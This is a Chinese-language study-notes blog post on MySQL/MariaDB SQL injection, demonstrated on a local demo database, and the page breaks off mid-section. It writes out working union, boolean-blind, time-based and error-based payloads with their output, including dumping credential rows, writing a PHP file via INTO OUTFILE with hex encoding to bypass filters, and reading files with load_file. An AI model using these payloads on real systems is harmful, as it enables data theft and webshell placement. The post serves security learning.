@@ -1,0 +1,1743 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQL注入-学习笔记(一), PenTest 渗透测试">
+    <meta name="baidu-site-verification" content>
+    <meta name="google-site-verification" content>
+    <meta name="360-site-verification" content>
+    <meta name="description" content="SQL注入-学习笔记（一）
+SQL注入核心：1：寻找注入点 （提前闭合sql语句）2：利用注入点，配合一些手段，达到获取敏感数据的目的3：增删改查均可以注入高阶使用，需要想办法绕过安全机制探测注入点和获取数据
+
+联合注入-&amp;gt;获取数据库">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>SQL注入-学习笔记(一) | Royee的安全屋</title>
+    <link rel="icon" type="image/png" href="/medias/about/logo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body>
+
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/about/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Royee的安全屋</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/about/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Royee的安全屋</div>
+        <div class="logo-desc">
+            
+            专注于安全领域
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        SQL注入-学习笔记(一)
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                        <a href="/tags/SQLi/" target="_blank">
+                            <span class="chip bg-color">SQLi</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/PenTest/" class="post-category" target="_blank">
+                            PenTest
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-02-11
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                    Royee
+                    
+                </div>
+
+                
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    16 分
+                </div>
+                
+                
+
+                
+                <div id="busuanzi_container_page_pv" class="info-break-policy">
+                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                    <span id="busuanzi_value_page_pv"></span>
+                </div>
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SQL注入-学习笔记（一）"><a href="#SQL注入-学习笔记（一）" class="headerlink" title="SQL注入-学习笔记（一）"></a><center>SQL注入-学习笔记（一）</center></h1><blockquote>
+<p>SQL注入核心：<br>1：寻找注入点 （提前闭合sql语句）<br>2：利用注入点，配合一些手段，达到获取敏感数据的目的<br>3：增删改查均可以注入<br>高阶使用，需要想办法绕过安全机制探测注入点和获取数据</p>
+</blockquote>
+<h3 id="联合注入-gt-获取数据库-库名、用户名、版本、表名、列名"><a href="#联合注入-gt-获取数据库-库名、用户名、版本、表名、列名" class="headerlink" title="联合注入-&gt;获取数据库-库名、用户名、版本、表名、列名"></a><center>联合注入-&gt;获取数据库-库名、用户名、版本、表名、列名</center></h3><hr>
+<h4 id="union-select-1-1-1-1-判断表字段个数"><a href="#union-select-1-1-1-1-判断表字段个数" class="headerlink" title="union select 1,1,1,1 判断表字段个数"></a>union select 1,1,1,1 判断表字段个数</h4><ul>
+<li>直到不报错（different number of columns）即能判断个数</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin  union select 1;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+MariaDB [demo]&gt; select * from admin  union select 1,1;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+MariaDB [demo]&gt; select * from admin  union select 1,1,1;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+MariaDB [demo]&gt; select * from admin  union select 1,1,1,1;
++------+---------+----------+-------------+
+| id   | name    | password | commint_new |
++------+---------+----------+-------------+
+|    1 | admin   | 123456   | NULL        |
++------+---------+----------+-------------+</code></pre><hr>
+<h4 id="union-select-1-1-1-version-查数据库版本"><a href="#union-select-1-1-1-version-查数据库版本" class="headerlink" title="union select 1,1,1 version() 查数据库版本"></a><code>union select 1,1,1 version()</code> 查数据库版本</h4><ul>
+<li>系统函数version() 用于查询当前数据库版本</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,version();
++------+------+----------+-------------------+
+| id   | name | password | commint_new       |
++------+------+----------+-------------------+
+|    1 | 1    | 1        | 10.3.17-MariaDB-1 |
++------+------+----------+-------------------+</code></pre><hr>
+<h4 id="union-select-database-查询数据库名"><a href="#union-select-database-查询数据库名" class="headerlink" title="union select database() 查询数据库名"></a>union select database() 查询数据库名</h4><ul>
+<li>系统函数database() 用于查询当前所使用的数据库名</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,database();
++------+------+----------+-------------+
+| id   | name | password | commint_new |
++------+------+----------+-------------+
+|    1 | 1    | 1        | demo        |
++------+------+----------+-------------+</code></pre><hr>
+<h4 id="union-select-user-查询当前用户名"><a href="#union-select-user-查询当前用户名" class="headerlink" title="union select user() 查询当前用户名"></a>union select user() 查询当前用户名</h4><ul>
+<li>系统函数user() 用于查询当前用户名</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,database();
++------+------+----------+-------------+
+| id   | name | password | commint_new |
++------+------+----------+-------------+
+|    1 | 1    | 1        | demo        |
++------+------+----------+-------------+</code></pre><hr>
+<h4 id="使用系统表information-schema-TABLES-查询当前库的所有表名"><a href="#使用系统表information-schema-TABLES-查询当前库的所有表名" class="headerlink" title="使用系统表information_schema.TABLES 查询当前库的所有表名"></a>使用系统表information_schema.TABLES 查询当前库的所有表名</h4><ul>
+<li>系统表：information_schema.TABLES </li>
+<li>字段名：TABLE_NAME, TABLE_SCHEMA</li>
+<li><code>union select 1,1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()</code></li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,table_name from information_schema.TABLES where TABLE_SCHEMA=database();
++------+------+----------+-------------+
+| id   | name | password | commint_new |
++------+------+----------+-------------+
+|    1 | 1    | 1        | admin1      |
+|    1 | 1    | 1        | admin       |
++------+------+----------+-------------+
+MariaDB [demo]&gt; show tables;
++----------------+
+| Tables_in_demo |
++----------------+
+| admin          |
+| admin1         |
++----------------+</code></pre><hr>
+<h4 id="使用系统表information-schema-COLUMNS-查询列名"><a href="#使用系统表information-schema-COLUMNS-查询列名" class="headerlink" title="使用系统表information_schema.COLUMNS 查询列名"></a>使用系统表information_schema.COLUMNS 查询列名</h4><ul>
+<li>系统表： information_schema.COLUMNS</li>
+<li>字段名： COLUMN_NAME</li>
+<li><code>union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39;</code> </li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39;;   --admin为前面获取到的数表名
++------+------+----------+-------------+
+| id   | name | password | commint_new |
++------+------+----------+-------------+
+|    1 | 1    | 1        | id          |
+|    1 | 1    | 1        | name        |
+|    1 | 1    | 1        | password    |
+|    1 | 1    | 1        | commint_new |
++------+------+----------+-------------+
+
+MariaDB [demo]&gt; desc admin;
++-------------+-----------+------+-----+---------+-------+
+| Field       | Type      | Null | Key | Default | Extra |
++-------------+-----------+------+-----+---------+-------+
+| id          | int(11)   | YES  |     | NULL    |       |
+| name        | char(32)  | YES  |     | NULL    |       |
+| password    | char(32)  | YES  |     | NULL    |       |
+| commint_new | char(255) | YES  |     | NULL    |       |
++-------------+-----------+------+-----+---------+-------+
+</code></pre><hr>
+<h4 id="最终查出所有字段及表数据"><a href="#最终查出所有字段及表数据" class="headerlink" title="最终查出所有字段及表数据"></a>最终查出所有字段及表数据</h4><pre><code>MariaDB [demo]&gt; select * from admin where 1=2;
+Empty set (0.001 sec)
+MariaDB [demo]&gt; select * from admin where 1=2 union select id,name,password,commint_new from admin;
++------+---------+----------+-------------+
+| id   | name    | password | commint_new |
++------+---------+----------+-------------+
+|    1 | admin   | 123456   | NULL        |
+|    4 | abc     | 123      | NULL        |
+|    2 | wang    | s123     | NULL        |
+|    3 | li      | s123     | NULL        |
+|    2 | admin2  | 1234567  | asdf        |
+|    3 | admin3  | 1234567  | wer         |
+|    4 | admin4  | 1234567  | asdf        |
+|    5 | admin5  | 1234567  | awerq       |
+|    6 | admin6  | 1234567  | afh         |
+|    3 | admin3  | 1234567  | werwer      |
+|    7 | admin7  | 1234567  | wers        |
+|    9 | admin9  | 1234567  | asfe        |
+|    8 | admin8  | 1234567  | swer        |
+|   10 | admin10 | 1234567  | fgjhgk      |
+|   11 | admin11 | 1234567  | werer       |
+|   12 | admin12 | 1234567  | wooij       |
+|   11 | admin12 | 1234567  | uihnkn      |
+|   15 | admin15 | 1234567  | werwer      |
+|   16 | admin16 | 1234567  | 1235        |
+|   11 | admin   | 1234567  | zxcvdfg     |
+|    9 | admin9  | 1234567  | hjyutrrty   |
+|   17 | admin17 | 1234567  | wqerwe      |
++------+---------+----------+-------------+</code></pre><h5 id="注-limit-0-1-的巧妙运用，用来获取数据"><a href="#注-limit-0-1-的巧妙运用，用来获取数据" class="headerlink" title="注:limit 0,1 的巧妙运用，用来获取数据"></a>注:limit 0,1 的巧妙运用，用来获取数据</h5><p><img src="1.jpg" alt></p>
+<hr>
+<h2 id="联合注入-gt-导出文件、getshell"><a href="#联合注入-gt-导出文件、getshell" class="headerlink" title="联合注入-&gt;导出文件、getshell"></a><center>联合注入-&gt;导出文件、getshell</center></h2><h4 id="联合注入和文件写入的结合"><a href="#联合注入和文件写入的结合" class="headerlink" title="联合注入和文件写入的结合"></a>联合注入和文件写入的结合</h4><h5 id="导出数据到外部文件"><a href="#导出数据到外部文件" class="headerlink" title="导出数据到外部文件"></a>导出数据到外部文件</h5><ul>
+<li>一般数据库是用非root用户启的，路径会有局限性</li>
+<li>导出文件，默认在mysql的datadir下肯定有写权限  ps -elf|grep mysql 回显中查看 –datadir=/var/lib/mysql</li>
+</ul>
+<ul>
+<li>关键字 sql语句 + into outfile ‘路径/文件名.文件名后缀’</li>
+</ul>
+<h6 id="联合注入实现数据导出到自定义文件-my-txt或my-sql"><a href="#联合注入实现数据导出到自定义文件-my-txt或my-sql" class="headerlink" title="联合注入实现数据导出到自定义文件(my.txt或my.sql)"></a>联合注入实现数据导出到自定义文件<code>(my.txt或my.sql)</code></h6><ul>
+<li>系统关键字 <code>into outfile(&#39;路径+文件&#39;)</code></li>
+<li>文件所在目录有写权限<pre><code>MariaDB [demo]&gt; select &#39;This php code&#39; into outfile &#39;./1.txt&#39;;
+Query OK, 1 row affected (0.001 sec)
+root@localhost:/var/lib/mysql# cat 1.txt
+This php code
+MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39; into outfile &#39;/root/tmp/my.txt&#39;;
+ERROR 1 (HY000): Can&#39;t create/write to file &#39;/root/tmp/my.txt&#39; (Errcode: 13 &quot;Permission denied&quot;)
+MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39; into outfile &#39;./my.txt&#39;;
+Query OK, 4 rows affected (0.001 sec)
+root@localhost:
+root@localhost:/var/lib/mysql# cat my.txt
+1       1       1       id
+1       1       1       name
+1       1       1       password
+1       1       1       commint_new</code></pre></li>
+</ul>
+<hr>
+<h6 id="联合注入实现代码写脚本格式文件"><a href="#联合注入实现代码写脚本格式文件" class="headerlink" title="联合注入实现代码写脚本格式文件"></a>联合注入实现代码写脚本格式文件</h6><ul>
+<li><code>select &#39;&lt;?php phpinfo() ?&gt;&#39; into outfile &#39;./index.php&#39;</code></li>
+<li>导出数据从数据库通过命令写文件，以实现脚本落地，达到getshell</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,&#39;&lt;?php phpinfo()?&gt;&#39; into outfile &#39;./index.php&#39;;
+root@localhost:/var/lib/mysql# cat index.php
+1       1       1       &lt;?php phpinfo()?&gt;</code></pre><ul>
+<li>高阶使用</li>
+<li>将php代码转成16进制绕过安全机制</li>
+<li><code>&lt;?php phpinfo()?&gt;</code>==&gt; 3c3f70687020706870696e666f28293f3e</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,0x3c3f70687020706870696e666f28293f3e into outfile &#39;./index.php&#39;;
+Query OK, 1 row affected (0.001 sec)
+root@localhost:/var/lib/mysql# cat index.php
+1       1       1       &lt;?php phpinfo()?&gt;
+
+#数据库自己将hex进制转换为ascii码
+MariaDB [demo]&gt; select 0x3c3f70687020706870696e666f28293f3e;
++--------------------------------------+
+| 0x3c3f70687020706870696e666f28293f3e |
++--------------------------------------+
+| &lt;?php phpinfo()?&gt;                    |
++--------------------------------------+</code></pre><hr>
+<h6 id="联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据"><a href="#联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据" class="headerlink" title="联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据"></a>联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据</h6><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select id,name,password,commint_new from admin into outfile &#39;./my.php&#39;;</code></pre><h2 id="联合注入-gt-读取文件"><a href="#联合注入-gt-读取文件" class="headerlink" title="联合注入-&gt;读取文件"></a><center>联合注入-&gt;读取文件</center></h2><h4 id="联合注入和文件读取的结合"><a href="#联合注入和文件读取的结合" class="headerlink" title="联合注入和文件读取的结合"></a>联合注入和文件读取的结合</h4><ul>
+<li>系统函数<code>load_file()</code></li>
+<li>文件所在目录有读权限</li>
+<li>读取文件函数 <code>load_file(&#39;./index.php&#39;)</code></li>
+<li>读取文件转成hex绕过一些安全机制 </li>
+</ul>
+<ul>
+<li><code>load_file(&#39;./index.php&#39;)</code></li>
+<li><code>load_file(0x2e2f696e6465782e706870)</code></li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,load_file(&#39;./index.php&#39;) from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39;;
++------+------+----------+--------------------------+
+| id   | name | password | commint_new              |
++------+------+----------+--------------------------+
+|    1 | 1    | 1        | &lt;?php phpinfo()?&gt;
+ |
++------+------+----------+--------------------------+
+
+MariaDB [demo]&gt; select load_file(0x2e2f696e6465782e706870);
++-------------------------------------+
+| load_file(0x2e2f696e6465782e706870) |
++-------------------------------------+
+| &lt;?php phpinfo()?&gt;
+                  |
++-------------------------------------+</code></pre><hr>
+<h2 id="联合注入-gt-和注释符的联合运用"><a href="#联合注入-gt-和注释符的联合运用" class="headerlink" title="联合注入-&gt;和注释符的联合运用"></a><center>联合注入-&gt;和注释符的联合运用</center></h2><ul>
+<li>mysql注释符有：</li>
+</ul>
+<ul>
+<li><code>#: 在html语言里有#，所以在web端需要将#转编码让浏览器在解析html时不认为是锚点  固要将# 转码为%23 (URL编码\ 见下图</code></li>
+<li>--</li>
+<li>//</li>
+<li>/**/<!--锚点.html 在SQL注入-学习笔记(一)文件夹下-->
+
+</li>
+</ul>
+<p><img src="2020-02-04-23-37-36.gif" alt="锚点示例"><br><img src="2.jpg" alt="#转码为%23"></p>
+<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a><center>布尔注入</center></h2><blockquote>
+<p>常用payload</p>
+</blockquote>
+<pre><code>1&#39; or 1=1
+1 or &#39;1&#39; = &#39;1
+1 or true
+&#39; or !false
+1 -- asdfasdf 
+
+#mid(str,start,length): 字符串截取函数 start&gt;=1, length &lt;= 字符串长度
+MariaDB [demo]&gt; select mid(&#39;12345&#39;,1,2);
++------------------+
+| mid(&#39;12345&#39;,1,2) |
++------------------+
+| 12               |
++------------------+
+
+#ord():   ASCII码转换函数ord(**) 
+MariaDB [demo]&gt; select ord(&#39;A&#39;);
++----------+
+| ord(&#39;A&#39;) |
++----------+
+|       65 |
++----------+
+
+#length(): 长度测量 
+select length(&#39;12345&#39;);
++-----------------+
+| length(&#39;12345&#39;) |
++-----------------+
+|               5 |
++-----------------+
+
+#version() 数据库版本查看
+#databse() 数据库名查看
+#user() 数据库用户查看
+#show databases; 当前数据库仓储中有什么数据库
+#select count(SCHEMA_NAME) from information_schema.schemata;  获取当前数据仓储中有多少数据库
+
+
+#1&#39; and length(database()) &gt;=4 当返回True时，可以获取数据库名长度
+MariaDB [demo]&gt; select * from admin where id=1 and length(database()) &gt;=5;
+Empty set (0.000 sec)
+
+MariaDB [demo]&gt; select * from admin where id=1 and length(database()) &gt;=4;
++------+-------+----------+-------------+
+| id   | name  | password | commint_new |
++------+-------+----------+-------------+
+|    1 | admin | 123456   | NULL        |
++------+-------+----------+-------------+
+
+#1&#39; and mid(database(),1,1) = &#39;d&#39;  用来遍历数据库名
+MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;a&#39;;
+Empty set (0.001 sec)
+MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;b&#39;;
+Empty set (0.000 sec)
+MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;c&#39;;
+Empty set (0.000 sec)
+MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;d&#39;;
++------+-------+----------+-------------+
+| id   | name  | password | commint_new |
++------+-------+----------+-------------+
+|    1 | admin | 123456   | NULL        |
++------+-------+----------+-------------+
+
+MariaDB [demo]&gt; select * from admin where id=1 and ord(mid(database(),1,1)) &gt;=101; ---枚举字符可以转成ascii码用于判断
+Empty set (0.000 sec)
+
+MariaDB [demo]&gt; select * from admin where id=1 and ord(mid(database(),1,1)) &gt;=100;
++------+-------+----------+-------------+
+| id   | name  | password | commint_new |
++------+-------+----------+-------------+
+|    1 | admin | 123456   | NULL        |
++------+-------+----------+-------------+
+</code></pre><h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a><center>时间注入</center></h2><blockquote>
+<p>常用payload</p>
+</blockquote>
+<pre><code>sleep(x)  x是秒数
+sleep(if(true,x,0)) 如果表达式为真，则休眠x秒， 
+
+#判断数据库个数
+MariaDB [demo]&gt; select * from admin where id =1 and sleep(if((select count(schema_name) from information_schema.schemata) =1,5,0));  
+Empty set (0.001 sec)
+
+MariaDB [demo]&gt; select * from admin where id =1 and sleep(if((select count(schema_name) from information_schema.schemata) =5,5,0)); --如果数据库数目等于1，则休眠5秒
+Empty set (5.001 sec)</code></pre><h2 id="mysql数据库BUG注入"><a href="#mysql数据库BUG注入" class="headerlink" title="mysql数据库BUG注入"></a><center>mysql数据库BUG注入</center></h2><pre><code>#利用数据库的BUG（即，count(), rand(),group by 连用时）进行利用，看报错信息。报错信息里携带了敏感数据
+#mmysql有个bug，在表数据条目大于3情况下会返回字段值,小于3条时会返回表记录。早期版本，新版本已修复，老版本任然好用
+- 表记录小于3条时：
+MariaDB [demo]&gt; select concat(floor(rand(0)*2),&quot;+++++++&quot;) as xx,count(1) from admin1 group by xx;
++----------+----------+
+| xx       | count(1) |
++----------+----------+
+| 1+++++++ |        1 |
++----------+----------+
+
+表记录大于3条时：
+MariaDB [demo]&gt; select concat(floor(rand(0)*2),&quot;+++++++&quot;) as xx,count(1) from admin group by xx;
+ERROR 1062 (23000): Duplicate entry &#39;1+++++++&#39; for key &#39;group_key&#39;
+
+此时可以加以利用
+(爆库)爆出数据库名，用户名等
+MariaDB [demo]&gt; select concat(floor(rand(0)*2),database()) as xx,count(1) from admin1 group by xx;
+ERROR 1062 (23000): Duplicate entry &#39;1demo&#39; for key &#39;group_key&#39;
+
+MariaDB [demo]&gt; select concat(floor(rand(0)*2),user()) as xx,count(1) from admin1 group by xx;
+ERROR 1062 (23000): Duplicate entry &#39;1root@&#39; for key &#39;group_key&#39;
+
+(爆表)爆当前数据库所有表名（admin1）
+MariaDB [demo]&gt; select concat(floor(rand(0)*3),(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1)) as xx,count(1) from admin group by xx;
+ERROR 1062 (23000): Duplicate entry &#39;1admin1&#39; for key &#39;group_key&#39;
+
+(爆表的字段)爆当前数据库表的列名
+MariaDB [demo]&gt; select concat(floor(rand(0)*3),(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39; limit 0,1)) as xx,count(1) from admin group by xx;
+ERROR 1062 (23000): Duplicate entry &#39;1id&#39; for key &#39;group_key&#39;
+
+（爆表记录）
+MariaDB [demo]&gt; select concat(floor(rand(0)*2),(select concat(&#39;|&#39;,id,&#39;|&#39;,name,&quot;|&quot;,password) from admin limit 0,1)) as xx,count(1) from admin group by xx;
+ERROR 1062 (23000): Duplicate entry &#39;1|1|admin|123456&#39; for key &#39;group_key&#39;
+</code></pre><h2 id="mysql注入函数报错"><a href="#mysql注入函数报错" class="headerlink" title="mysql注入函数报错"></a><center>mysql注入函数报错</center></h2><ul>
+<li>updatxml</li>
+</ul>
+<pre><code>UPDATEXML (XML_document, XPath_string, new_value);
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+第三个参数：new_value，String格式，替换查找到的符合条件的数据 
+
+MariaDB [demo]&gt; select * from admin where id =1 and updatexml(1,conact(0x7c,(select user()),1),1);
+ERROR 1305 (42000): FUNCTION demo.conact does not exist</code></pre><ul>
+<li>extractvalue</li>
+</ul>
+<pre><code>extractvalue(目标xml文档，xml路径)
+
+MariaDB [demo]&gt; select * from admin where id =1 and updatexml(1,concat(0x7c,(select user()),1),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;|root@1&#39;</code></pre><h2 id="添加型注入"><a href="#添加型注入" class="headerlink" title="添加型注入"></a><center>添加型注入</center></h2><ul>
+<li>一样都是提前闭合，改变sql语句含义，将sql payload结果 insert、update进数据库，再查询获得注入结果</li>
+</ul>
+<pre><code>MariaDB [demo]&gt; select * from admin1;
++------+------+----------+
+| id   | name | password |
++------+------+----------+
+|    1 | aaa  | 123456   |
++------+------+----------+
+1 row in set (0.001 sec)
+
+#场景一
+MariaDB [demo]&gt; insert into admin1 values(2,(select user()),(select database()));
+Query OK, 1 row affected (0.369 sec)
+
+MariaDB [demo]&gt; select * from admin1;
++------+-------+----------+
+| id   | name  | password |
